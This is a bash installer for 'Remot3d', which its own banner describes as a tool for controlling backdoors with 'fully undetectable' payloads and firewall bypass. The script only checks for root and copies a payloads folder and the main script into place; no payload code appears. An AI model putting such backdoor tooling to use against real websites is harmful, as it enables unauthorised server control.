#!/bin/bash   
#                          WARNING !
##############################################################
# This is a USELESS Project, if you like it just donate
# to me.
##############################################################
# BITCOIN       :
# PAYPAL        : https://www.paypal.me/abdiprawiran
# PERFECT MONEY : U15461128
#################### Made by 16 y.o Boys #####################
##############################################################
#   Thank's to IndoXploit - ZeroByte.ID - Eldersc0de Family
#  Special Thanks : Reky Ardhana, Novran Fathir & Bayu Fedra 
##############################################################
#                        UPDATE V-2.0
# Whats new? Update and include new FUD Backdoor, Accourate
# Check Backdoor Live or Not, Password for Connect the
# Backdoor and much more Unique Logic Script to Bypass WAF
# (Website Applications Firewall).
##############################################################
##                    COLORING YOUR SHELL                   ##
##############################################################
white="\033[1;37m"                                          ##
grey="\033[0;37m"                                           ##
purple="\033[0;35m"                                         ##
red="\033[1;31m"                                            ##
green="\033[1;32m"                                          ##
yellow="\033[1;33m"                                         ##
purple="\033[0;35m"                                         ##
cyan="\033[0;36m"                                           ##
cafe="\033[0;33m"                                           ##
fiuscha="\033[0;35m"                                        ##
blue="\033[1;34m"                                           ##
nc="\e[0m"                                                  ##
bgr="\e[0;41m"                                              ##
##############################################################
spinlong ()
{
    bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ "
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}
banner(){
printf " ${white}     
            #########################################################################
            ##                                                                     ##  
            ##                                   /\ \                              ##
            ##                                  /  \ \                             ##
            ##                                 / /\ \ \                            ##
            ##                                / / /\ \_\                           ##
            ##                               / / /_/ / /                           ##
            ##                              / / /__\/ /                            ##
            ##                             / / /_____/                             ##
            ##                            / / /\ \ \                               ## 
            ##                           / / /  \ \ \                              ##
            ##                           \/_/    \_\/                              ##
            ##                                                                     ##
            #########################################################################
            ##                           Remot3d Installer                         ##
            #########################################################################
            ##                            • DISCLAIMER •                           ##
            ##                                                                     ##
            ##      we are not responsible for what is done with these Tools,      ##
            ##      made for education. all crimes are borne by this user tool.    ##
            ##      Made in the language of BASH / Shell Scripting, its function   ##
            ##      makes it easy to control the Backdoor easily and has several   ##
            ##      features to bypass the firewall with FUD (FULLY UNDETECTABLE)  ##
            ##      Script.                                                        ##
            #########################################################################
\n"
}
install() {
if [[ $(whoami) != "root" ]]
then
printf "             ${white}[•] ${red}This script must be run as root ${white}[•]\n"
exit
fi
sleep 2
check=$(ls lib | grep payloads)
if [[ $check == "payloads" ]];then
installation=$(cp -r lib/payloads $HOME/.rmtd-payloads && cp Remot3d.sh /usr/bin/Remot3d && chmod +x /usr/bin/Remot3d)
echo -e "            [$green ✔$white ] Install Payloads............................................"
sleep 2
echo -e "            [$green ✔$white ] Install Remot3d............................................."
sleep 1
echo -e "            [$green !$white ]Done ! Just Command$yellow Remot3d$white And Enjoy the TRASH TOOLS !"
else 
echo "            Try to run at the Remot3d Folder !"
echo "            Exiting...";
sleep 1
echo "";
exit
fi
}
clear
spinlong
clear
printf "\e[8;30;99t"
banner
install